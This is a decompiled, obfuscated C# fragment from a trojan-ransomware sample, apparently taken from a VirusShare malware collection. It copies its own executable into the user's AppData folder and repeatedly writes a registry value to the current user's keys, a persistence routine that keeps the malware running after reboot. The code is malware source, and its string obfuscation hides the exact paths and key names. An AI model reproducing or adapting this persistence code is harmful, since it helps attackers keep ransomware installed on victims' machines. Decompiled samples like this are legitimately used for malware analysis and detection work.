// Decompiled with JetBrains decompiler
// Type: .
// Assembly: msn, Version=1.7.0.1, Culture=neutral, PublicKeyToken=null
// MVID: C3204E8B-C6C9-4864-AB4A-50B3E5132C84
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00080-msil\HEUR-Trojan-Ransom.Win32.Generic-57375c6c5fdf5cb633258ada4e91cf8f7605a4cb97903a0ea974e04b7dacd954.exe

using \u0006;
using \u000E;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Threading;

namespace \u0006
{
  internal class \u008D\u001A
  {
    public class \u000E\u0005
    {
      public static string \u0001 = \u0016\u001C.\u0014\u001C(\u0008.\u0007(2698), \u0008.\u0007(285));
      public static string \u0002 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + \u0016\u001C.\u0014\u001C(\u0008.\u0007(2727), \u0008.\u0007(285));

      public static void \u0004\u0005()
      {
        int num1 = 0;
        try
        {
          if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + \u0016\u001C.\u0014\u001C(\u0008.\u0007(2727), \u0008.\u0007(285))))
            File.Copy(Process.GetCurrentProcess().MainModule.FileName, Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + \u0016\u001C.\u0014\u001C(\u0008.\u0007(2727), \u0008.\u0007(285)), true);
        }
        catch (Exception ex)
        {
          int num2;
          int lErl = num2;
          ProjectData.SetProjectError(ex, lErl);
          ProjectData.ClearProjectError();
        }
        while (true)
        {
          int num3 = 1;
          try
          {
            RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(\u0016\u001C.\u0014\u001C(\u0008.\u0007(2772), \u0008.\u0007(285)), true);
            registryKey.SetValue(\u008D\u001A.\u000E\u0005.\u0001, (object) \u008D\u001A.\u000E\u0005.\u0002);
            registryKey.Close();
            Thread.Sleep(5000);
            try
            {
              \u0013\u001C.\u0084.Abort();
              break;
            }
            catch (Exception ex)
            {
              int lErl = num3;
              ProjectData.SetProjectError(ex, lErl);
              ProjectData.ClearProjectError();
              break;
            }
          }
          catch (Exception ex1)
          {
            int lErl1 = num3;
            ProjectData.SetProjectError(ex1, lErl1);
            if (num1 == 3)
            {
              try
              {
                \u0013\u001C.\u0084.Abort();
              }
              catch (Exception ex2)
              {
                int lErl2 = num3;
                ProjectData.SetProjectError(ex2, lErl2);
                ProjectData.ClearProjectError();
              }
              ProjectData.ClearProjectError();
              break;
            }
            checked { ++num1; }
            ProjectData.ClearProjectError();
          }
        }
      }
    }
  }
}
